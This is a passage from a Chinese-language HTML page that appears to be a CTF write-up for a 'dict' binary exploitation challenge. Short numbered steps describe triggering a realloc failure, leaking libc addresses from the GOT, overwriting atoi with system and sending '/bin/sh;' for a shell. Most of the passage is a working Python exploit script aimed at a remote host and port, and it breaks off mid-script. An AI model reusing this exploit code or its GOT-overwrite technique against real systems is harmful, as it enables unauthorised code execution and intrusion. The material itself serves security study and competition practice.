28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">利用方法:</span></p><p style="margin-left: 80px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">1.申请6个字典</span></p><p style="margin-left: 80px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">2.往字典1中添加4203782个单词,</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #0x0804a0c0/0x20</span></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; count_to_node0 = 4203782</span></p><p style="margin-left: 80px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">3.在申请0x0f101010个单词,发生realloc失败,填写全局变量0x804a0c0中的数据</span></p><p style="margin-left: 80px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">4.分别泄露atoi,puts,memset(本来常理泄露一个就行,用libcdatabase就可以找到,但是有的不同libc中system地址根据偏移计算是对的,但是其他小函数计算就老是不对,在这里全泄露出来)</span></p><p style="margin-left: 80px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">5.计算system地址,从 puts的got表开始覆盖,直至覆盖到atoi,puts和memset函数需要正确填写,因为后面还有用到:</span></p><p style="margin-left: 80px; text-align: left; text-indent: 4px;"><br/></p><p style="text-align: center;"><img alt="http://p8.qhimg.com/t01f52bc921af0169b7.png" src="http://p2.qhimg.com/t01e75499466e78d7e2.png" title="t01f52bc921af0169b7.png"/></p><p><br/></p><p style="margin-left: 80px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">6.在输入选择的时候,直接传“/bin/sh;”就可以拿到shell了。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码如下:</span></p><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:python;toolbar:false">__author__&nbsp;=&nbsp;&quot;pxx&quot;
from&nbsp;zio&nbsp;import&nbsp;*
import&nbsp;struct
target&nbsp;=&nbsp;&quot;./dict&quot;
target&nbsp;=&nbsp;(&quot;202.120.7.146&quot;,&nbsp;9992)#
def&nbsp;get_io(target):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;io
def&nbsp;full_buff(cur_data,&nbsp;length,&nbsp;ch_t&nbsp;=&nbsp;&#39;a&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len_t&nbsp;=&nbsp;length&nbsp;-&nbsp;len(cur_data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;cur_data&nbsp;+&nbsp;ch_t&nbsp;*&nbsp;len_t
def&nbsp;create_dict(io,&nbsp;count,&nbsp;value_list):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(&quot;1\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;dict:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(str(count)&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;index,&nbsp;item&nbsp;in&nbsp;enumerate(value_list):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;%d:&quot;%index)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(item)
def&nbsp;add_new_words(io,&nbsp;index,&nbsp;count,&nbsp;value_list,&nbsp;yes_sign&nbsp;=&nbsp;True):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(&quot;2\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;dict:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(str(index)&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;add?&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(str(count)&nbsp;+&nbsp;&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;index,&nbsp;item&nbsp;in&nbsp;enumerate(value_list):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Input&nbsp;new&nbsp;word&nbsp;%d:&nbsp;&quot;%index)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;send&nbsp;one&quot;,&nbsp;len(item)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;length&nbsp;=&nbsp;len(item)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;length&nbsp;&gt;&nbsp;10000&nbsp;and&nbsp;yes_sign:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sign&nbsp;=&nbsp;False
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add_count&nbsp;=&nbsp;50000
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;index&nbsp;&lt;&nbsp;length:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;index
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(item[index:index+add_count])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;+=&nbsp;add_count
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;index&nbsp;&gt;&nbsp;length:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;index&nbsp;=&nbsp;length
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sign&nbsp;=&nbsp;True
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Input&nbsp;new&nbsp;word&nbsp;%d:&nbsp;&quot;%(index/2&nbsp;-&nbsp;1))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;Input&nbsp;new&nbsp;word&nbsp;%d:&nbsp;&quot;%(index/2&nbsp;-&nbsp;1))&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(item)
def&nbsp;view_words(io,&nbsp;index):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(&quot;3\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;dict:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(str(index)&nbsp;+&nbsp;&quot;\n&quot;)
def&nbsp;pwn(io):&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts_got_addr&nbsp;=&nbsp;0x0804a020
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;atoi_got_addr&nbsp;=&nbsp;0x0804a038
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset_got_addr&nbsp;=&nbsp;0x0804a034
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;len_to_write&nbsp;=&nbsp;atoi_got_addr&nbsp;-&nbsp;puts_got_addr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list&nbsp;=&nbsp;[];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#0x0804a020/0x20
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count_to_puts&nbsp;=&nbsp;4203777
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#0x0804a0c0/0x20
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count_to_node0&nbsp;=&nbsp;4203782
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#0x0804a0e0/0x20
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count_to_node4&nbsp;=&nbsp;4203783
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#count_to_node0&nbsp;=&nbsp;20000
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_dict(io,&nbsp;1,&nbsp;value_list)#0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_dict(io,&nbsp;1,&nbsp;value_list)#1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_dict(io,&nbsp;1,&nbsp;value_list)#2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_dict(io,&nbsp;1,&nbsp;value_list)#3
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_dict(io,&nbsp;1,&nbsp;value_list)#4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;create_dict(io,&nbsp;1,&nbsp;value_list)#5
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;xrange(count_to_node0):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(&quot;8\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add_new_words(io,&nbsp;0,&nbsp;count_to_node0,&nbsp;[&quot;&quot;.join(value_list)])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#node0-&gt;count&nbsp;+&nbsp;ptr&nbsp;+&nbsp;node1-&gt;count&nbsp;+&nbsp;ptr
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(0x1)&nbsp;+&nbsp;l32(0)&nbsp;#0&nbsp;&nbsp;can&#39;t&nbsp;move
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(0x1)&nbsp;+&nbsp;l32(atoi_got_addr)&nbsp;#1&nbsp;show
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(count_to_puts)&nbsp;+&nbsp;l32(0x0)&nbsp;#2&nbsp;add
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(payload&nbsp;+&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(0x1)&nbsp;+&nbsp;l32(puts_got_addr)&nbsp;#4&nbsp;show
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(0x1)&nbsp;+&nbsp;l32(memset_got_addr)&nbsp;#5&nbsp;show
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(payload&nbsp;+&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add_new_words(io,&nbsp;0,&nbsp;0x0f101010,&nbsp;value_list,&nbsp;False)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;value_list
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;view_words(io,&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;1:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read(4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;[c&nbsp;for&nbsp;c&nbsp;in&nbsp;data]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;atoi_real_addr&nbsp;=&nbsp;l32(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;atoi_real_addr:&quot;,&nbsp;hex(atoi_real_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;view_words(io,&nbsp;4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;1:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read(4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;[c&nbsp;for&nbsp;c&nbsp;in&nbsp;data]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts_real_addr&nbsp;=&nbsp;l32(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;puts_real_addr:&quot;,&nbsp;hex(puts_real_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;view_words(io,&nbsp;5)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;1:&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;io.read(4)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;[c&nbsp;for&nbsp;c&nbsp;in&nbsp;data]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset_real_addr&nbsp;=&nbsp;l32(data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;memset_real_addr:&quot;,&nbsp;hex(memset_real_addr)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#local
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_atoi&nbsp;=&nbsp;0x0002fbb0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;=&nbsp;0x0003e800
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_puts&nbsp;=&nbsp;0x000656a0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_memset&nbsp;=&nbsp;0x0007c680
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#remote
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_atoi&nbsp;=&nbsp;0x00031860
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;=&nbsp;0x00040190
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;is_know&nbsp;=&nbsp;True
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;is_know&nbsp;==&nbsp;False:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_atoi&nbsp;=&nbsp;int(raw_input(&quot;atoi_off_set:&quot;),&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;=&nbsp;int(raw_input(&quot;system_off_set:&quot;),&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_puts&nbsp;=&nbsp;int(raw_input(&quot;puts_offset:&quot;),&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#offset_memset&nbsp;=&nbsp;int(raw_input(&quot;memset_offset:&quot;),&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_real_addr&nbsp;=&nbsp;atoi_real_addr&nbsp;-&nbsp;offset_atoi
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system_real_addr&nbsp;=&nbsp;libc_real_addr&nbsp;+&nbsp;offset_system
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#puts_real_addr&nbsp;=&nbsp;libc_real_addr&nbsp;+&nbsp;offset_puts
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#memset_real_addr&nbsp;=&nbsp;libc_real_addr&nbsp;+&nbsp;offset_memset
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list&nbsp;=&nbsp;[]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l32(puts_real_addr)&nbsp;+&nbsp;&#39;a&#39;&nbsp;*&nbsp;(len_to_write&nbsp;-&nbsp;8)&nbsp;+&nbsp;l32(memset_real_addr)&nbsp;+&nbsp;l32(system_real_addr)&nbsp;#4
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(payload&nbsp;+&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value_list.append(&quot;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;begin&nbsp;to&nbsp;send&nbsp;useful&nbsp;data&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add_new_words(io,&nbsp;2,&nbsp;0x0f101010,&nbsp;value_list,&nbsp;False)
